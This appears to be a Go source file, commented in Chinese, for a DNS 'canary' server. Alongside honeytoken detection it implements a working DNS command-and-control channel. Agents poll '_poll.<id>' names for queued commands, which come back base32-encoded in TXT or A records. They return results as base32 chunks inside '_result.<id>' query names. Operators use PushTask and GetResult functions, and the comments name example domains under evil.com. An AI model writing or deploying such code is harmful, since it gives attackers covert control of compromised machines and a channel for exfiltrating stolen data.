// Package canary 提供 DNS Canary 服务器监听。
// 使用纯 UDP 套接字实现 DNS 服务器，无需外部依赖。
package canary

import (
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// DNSHeader 是 DNS 消息头。
type DNSHeader struct {
	ID      uint16
	Flags   uint16
	QDCount uint16
	ANCount uint16
	NSCount uint16
	ARCount uint16
}

// DNSQuestion 是 DNS 查询部分。
type DNSQuestion struct {
	QName  []byte // 原始编码的域名
	QType  uint16
	QClass uint16
}

// CanaryServer 是 DNS Canary 服务器。
type CanaryServer struct {
	detector       *CanaryDetector
	bindAddr       string
	baseDomain     string
	listener       *net.UDPConn
	running        bool
	mu             sync.Mutex
	onTrigger      func(canaryID, domain, sourceIP string)
	taskQueue      map[string][]byte    // agent_id → pending task
	taskTime       map[string]time.Time // agent_id → task insertion time
	resultStore    map[string][]byte    // agent_id → collected results
	resultTime     map[string]time.Time // agent_id → result insertion time
	resultMu       sync.Mutex
}

// Config 是 DNS Canary 服务器配置。
type Config struct {
	BindAddr     string // 监听地址，如 "0.0.0.0:53"
	BaseDomain   string // Canary 基础域名，如 "canary.evil.com"
	Detector     *CanaryDetector
	OnCanaryTrigger func(canaryID, domain, sourceIP string)
}

// NewCanaryServer 创建 DNS Canary 服务器。
func NewCanaryServer(cfg Config) *CanaryServer {
	if cfg.BindAddr == "" {
		cfg.BindAddr = "0.0.0.0:53"
	}
	return &CanaryServer{
		detector:    cfg.Detector,
		bindAddr:    cfg.BindAddr,
		baseDomain:  cfg.BaseDomain,
		onTrigger:   cfg.OnCanaryTrigger,
		taskQueue:   make(map[string][]byte),
		taskTime:    make(map[string]time.Time),
		resultStore: make(map[string][]byte),
		resultTime:  make(map[string]time.Time),
	}
}

// Start 启动 DNS 服务器监听。
func (s *CanaryServer) Start() error {
	s.mu.Lock()
	if s.running {
		s.mu.Unlock()
		return fmt.Errorf("DNS server already running")
	}
	s.running = true
	s.mu.Unlock()

	addr, err := net.ResolveUDPAddr("udp", s.bindAddr)
	if err != nil {
		return fmt.Errorf("resolve UDP addr: %w", err)
	}

	s.listener, err = net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("listen UDP: %w", err)
	}

	go s.serve()
	return nil
}

// Stop 停止 DNS 服务器。
func (s *CanaryServer) Stop() error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if !s.running {
		return nil
	}
	s.running = false
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

func (s *CanaryServer) serve() {
	buf := make([]byte, 512) // DNS over UDP 最大 512 字节
	for {
		n, remoteAddr, err := s.listener.ReadFromUDP(buf)
		if err != nil {
			if !s.running {
				return
			}
			continue
		}

		if n < 12 { // DNS 消息最小长度（12 字节头）
			continue
		}

		// 解析 DNS 查询
		question, qType, qNameStr := parseQuestion(buf[:n])
		if question == nil {
			continue
		}

		// C2 路由: _poll.<agent_id>.<domain> → 返回任务
		if strings.HasPrefix(qNameStr, "_poll.") {
			agentID := extractAgentID(qNameStr)
			if agentID != "" {
				response := s.handleC2Poll(buf[:n], question, agentID, qType)
				s.listener.WriteToUDP(response, remoteAddr)
				continue
			}
		}

		// C2 结果提交: _result.<agent_id>.<domain> → 存储结果
		if strings.HasPrefix(qNameStr, "_result.") {
			agentID := extractAgentID(qNameStr)
			if agentID != "" {
				s.handleC2Result(qNameStr, agentID)
				response := buildNXDOMAIN(buf[:n], question.QType, question.QClass)
				s.listener.WriteToUDP(response, remoteAddr)
				continue
			}
		}

		// 检查是否为 Canary 域名
		if s.detector != nil && strings.HasSuffix(strings.ToLower(qNameStr), s.baseDomain) {
			s.detector.CheckDNSQuery(qNameStr, remoteAddr.IP.String())
			if s.onTrigger != nil {
				canaryID := strings.TrimSuffix(qNameStr, "."+s.baseDomain)
				parts := strings.Split(qNameStr, ".")
				if len(parts) > 0 {
					canaryID = parts[0]
				}
				s.onTrigger(canaryID, qNameStr, remoteAddr.IP.String())
			}
			response := buildNXDOMAIN(buf[:n], question.QType, question.QClass)
			s.listener.WriteToUDP(response, remoteAddr)
			continue
		}

		// 非 Canary 域名：返回 NXDOMAIN（不转发，避免成为开放 DNS）
		response := buildNXDOMAIN(buf[:n], question.QType, question.QClass)
		s.listener.WriteToUDP(response, remoteAddr)
	}
}

// parseQuestion 从 DNS 消息中解析查询部分。
func parseQuestion(data []byte) (*DNSQuestion, uint16, string) {
	// 跳过 header（12 字节）
	header := data[:12]
	qdCount := binary.BigEndian.Uint16(header[4:6])
	if qdCount == 0 {
		return nil, 0, ""
	}

	// 解析域名
	pos := 12
	var labels []string
	for pos < len(data) {
		labelLen := int(data[pos])
		if labelLen == 0 {
			pos++
			break
		}
		if labelLen&0xC0 == 0xC0 {
			// 指针，跳过
			pos += 2
			break
		}
		pos++
		if pos+labelLen > len(data) {
			return nil, 0, ""
		}
		labels = append(labels, string(data[pos:pos+labelLen]))
		pos += labelLen
	}

	if pos+4 > len(data) {
		return nil, 0, ""
	}

	qType := binary.BigEndian.Uint16(data[pos:pos+2])
	qClass := binary.BigEndian.Uint16(data[pos+2:pos+4])

	qNameStr := strings.Join(labels, ".")
	q := &DNSQuestion{
		QName:  data[12:pos],
		QType:  qType,
		QClass: qClass,
	}
	return q, qType, strings.ToLower(qNameStr)
}

// buildNXDOMAIN 构建 NXDOMAIN 响应。
func buildNXDOMAIN(request []byte, qType, qClass uint16) []byte {
	if len(request) < 12 {
		return nil
	}

	// 复制请求 header
	response := make([]byte, len(request))
	copy(response, request)

	// 设置 Flags: QR=1, OPCODE=0, RCODE=3 (NXDOMAIN)
	flags := uint16(0x8000) | uint16(3) // QR=1, RCODE=NXDOMAIN
	binary.BigEndian.PutUint16(response[2:4], flags)

	// ANCount = 0, NSCount = 0, ARCount = 0
	binary.BigEndian.PutUint16(response[6:8], 0)
	binary.BigEndian.PutUint16(response[8:10], 0)
	binary.BigEndian.PutUint16(response[10:12], 0)

	return response
}

// IsRunning 返回服务器运行状态。
func (s *CanaryServer) IsRunning() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.running
}

// Addr 返回监听地址。
func (s *CanaryServer) Addr() string {
	return s.bindAddr
}

// SetDeadline 设置读取超时。
func (s *CanaryServer) SetDeadline(d time.Duration) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.listener != nil {
		return s.listener.SetReadDeadline(time.Now().Add(d))
	}
	return nil
}

// === DNS C2 Handler ===

const (
	taskTTL    = 10 * time.Minute
	resultTTL  = 30 * time.Minute
)

// PushTask 向指定 Agent 推送 C2 任务。
func (s *CanaryServer) PushTask(agentID string, command []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.taskQueue[agentID] = command
	s.taskTime[agentID] = time.Now()
}

// GetResult 获取 Agent 提交的 C2 结果。
func (s *CanaryServer) GetResult(agentID string) []byte {
	s.resultMu.Lock()
	defer s.resultMu.Unlock()
	data := s.resultStore[agentID]
	delete(s.resultStore, agentID)
	delete(s.resultTime, agentID)
	return data
}

// StartC2Cleaner 启动 TTL 清理 goroutine，防止 taskQueue 和 resultStore 无限增长。
func (s *CanaryServer) StartC2Cleaner() {
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			if !s.running {
				return
			}
			s.mu.Lock()
			now := time.Now()
			for id, at := range s.taskTime {
				if now.Sub(at) > taskTTL {
					delete(s.taskQueue, id)
					delete(s.taskTime, id)
				}
			}
			s.mu.Unlock()

			s.resultMu.Lock()
			for id, at := range s.resultTime {
				if now.Sub(at) > resultTTL {
					delete(s.resultStore, id)
					delete(s.resultTime, id)
				}
			}
			s.resultMu.Unlock()
		}
	}()
}

// handleC2Poll 处理 Agent 的任务轮询查询。
// 返回 base32 编码的命令内容到 TXT 记录响应中。
func (s *CanaryServer) handleC2Poll(request []byte, question *DNSQuestion, agentID string, qType uint16) []byte {
	s.mu.Lock()
	taskData, ok := s.taskQueue[agentID]
	if ok {
		delete(s.taskQueue, agentID)
	}
	s.mu.Unlock()

	if !ok || len(taskData) == 0 {
		// 无任务：返回 NXDOMAIN
		return buildNXDOMAIN(request, question.QType, question.QClass)
	}

	// 有任务：返回 TXT 记录（base32 编码）
	encoded := encodeBase32Chunks(taskData)

	if qType == 0x10 { // TXT record
		return buildTXTResponse(request, question, encoded)
	}

	// A record 请求：将 base32 数据分段编码到多个 A 记录中
	return buildARecordResponse(request, question, taskData)
}

// handleC2Result 处理 Agent 的结果提交。
// Agent 通过查询 _result.<agent_id>.<seq>.<base32_data>.<domain> 提交结果。
// 如果数据太长，Agent 会分片提交（每个 DNS 标签最大 63 字符，总域名最大 253 字符）。
func (s *CanaryServer) handleC2Result(fullDomain, agentID string) {
	prefix := "_result." + agentID + "."
	suffix := "." + s.baseDomain
	dataPart := strings.TrimPrefix(fullDomain, prefix)
	dataPart = strings.TrimSuffix(dataPart, suffix)

	if dataPart == "" {
		return
	}

	// 如果域名中包含 . 分隔的多段数据（分片），合并它们
	// 格式: <seq>.<chunk1>.<chunk2> 或 <chunk>
	parts := strings.Split(dataPart, ".")
	var base32Data string
	if len(parts) >= 2 {
		// 第一部分是序列号，跳过
		for _, p := range parts[1:] {
			base32Data += p
		}
	} else {
		base32Data = dataPart
	}

	if base32Data == "" {
		return
	}

	decoded, err := decodeBase32Flexible(base32Data)
	if err != nil {
		return
	}

	s.resultMu.Lock()
	s.resultStore[agentID] = append(s.resultStore[agentID], decoded...)
	s.resultTime[agentID] = time.Now()
	s.resultMu.Unlock()
}

// extractAgentID 从域名中提取 Agent ID。
// 例如: _poll.agent123.c2.evil.com → agent123
func extractAgentID(domain string) string {
	parts := strings.Split(domain, ".")
	if len(parts) < 3 {
		return ""
	}
	// parts[0] = "_poll" 或 "_result"
	// parts[1] = agent_id
	return parts[1]
}

// buildTXTResponse 构建 TXT 记录响应。
func buildTXTResponse(request []byte, question *DNSQuestion, txtData string) []byte {
	if len(request) < 12 {
		return nil
	}

	response := make([]byte, 0, len(request)+50+len(txtData))
	response = append(response, request[:12]...)

	// 设置 Flags: QR=1, RCODE=0 (NOERROR)
	binary.BigEndian.PutUint16(response[2:4], 0x8000)
	binary.BigEndian.PutUint16(response[6:8], 1) // ANCount = 1
	binary.BigEndian.PutUint16(response[8:10], 0)
	binary.BigEndian.PutUint16(response[10:12], 0)

	// 追加问题部分（QName 已包含终止符 0x00）
	response = append(response, question.QName...)

	// 追加 QType + QClass
	u16buf := make([]byte, 2)
	binary.BigEndian.PutUint16(u16buf, question.QType)
	response = append(response, u16buf...)
	binary.BigEndian.PutUint16(u16buf, question.QClass)
	response = append(response, u16buf...)

	// TXT RDATA: name (压缩指针) + type + class + ttl + rdlength + rdata
	response = append(response, 0xC0, 0x0C) // 压缩指针 → 问题中的域名
	binary.BigEndian.PutUint16(u16buf, 0x0010) // TXT type
	response = append(response, u16buf...)
	binary.BigEndian.PutUint16(u16buf, 0x0001) // class IN
	response = append(response, u16buf...)

	// TTL (4 bytes)
	u32buf := make([]byte, 4)
	binary.BigEndian.PutUint32(u32buf, 300)
	response = append(response, u32buf...)

	txtLen := len(txtData)
	if txtLen > 255 {
		txtLen = 255
	}
	response = append(response, byte(txtLen+1)) // rdlength
	response = append(response, byte(txtLen))   // TXT 字符串长度
	response = append(response, []byte(txtData[:txtLen])...)

	return response
}

// buildARecordResponse 将数据编码为多个 A 记录响应。
func buildARecordResponse(request []byte, question *DNSQuestion, data []byte) []byte {
	if len(request) < 12 || len(data) == 0 {
		return buildNXDOMAIN(request, question.QType, question.QClass)
	}

	numRecords := (len(data) + 3) / 4
	if numRecords > 5 {
		numRecords = 5
		data = data[:numRecords*4]
	}

	response := make([]byte, 0, len(request)+numRecords*16)
	response = append(response, request[:12]...)

	binary.BigEndian.PutUint16(response[2:4], 0x8000) // QR=1, RCODE=0
	binary.BigEndian.PutUint16(response[6:8], uint16(numRecords))
	binary.BigEndian.PutUint16(response[8:10], 0)
	binary.BigEndian.PutUint16(response[10:12], 0)

	response = append(response, question.QName...) // QName already includes terminating 0x00

	// QType + QClass
	u16buf := make([]byte, 2)
	binary.BigEndian.PutUint16(u16buf, question.QType)
	response = append(response, u16buf...)
	binary.BigEndian.PutUint16(u16buf, question.QClass)
	response = append(response, u16buf...)

	u32buf := make([]byte, 4)
	for i := 0; i < numRecords; i++ {
		offset := i * 4
		chunk := data[offset : offset+4]

		response = append(response, 0xC0, 0x0C) // 压缩指针
		binary.BigEndian.PutUint16(u16buf, 0x0001) // A type
		response = append(response, u16buf...)
		binary.BigEndian.PutUint16(u16buf, 0x0001) // class IN
		response = append(response, u16buf...)
		binary.BigEndian.PutUint32(u32buf, 300) // TTL
		response = append(response, u32buf...)
		response = append(response, 0x00, 0x04) // rdlength = 4
		response = append(response, chunk...)
	}

	return response
}

// encodeBase32Chunks 将数据编码为 base32 字符串，适合 DNS TXT 记录。
func encodeBase32Chunks(data []byte) string {
	return encodeBase32NoPad(data)
}

// encodeBase32NoPad 使用 base32 编码但不填充。
func encodeBase32NoPad(data []byte) string {
	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
	return enc.EncodeToString(data)
}

// decodeBase32Flexible 从 base32 字符串解码数据，支持填充和无填充。
func decodeBase32Flexible(s string) ([]byte, error) {
	// 尝试无填充解码
	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
	data, err := enc.DecodeString(s)
	if err == nil {
		return data, nil
	}
	// 添加填充后重试
	for len(s)%8 != 0 {
		s += "="
	}
	return base32.StdEncoding.DecodeString(s)
}
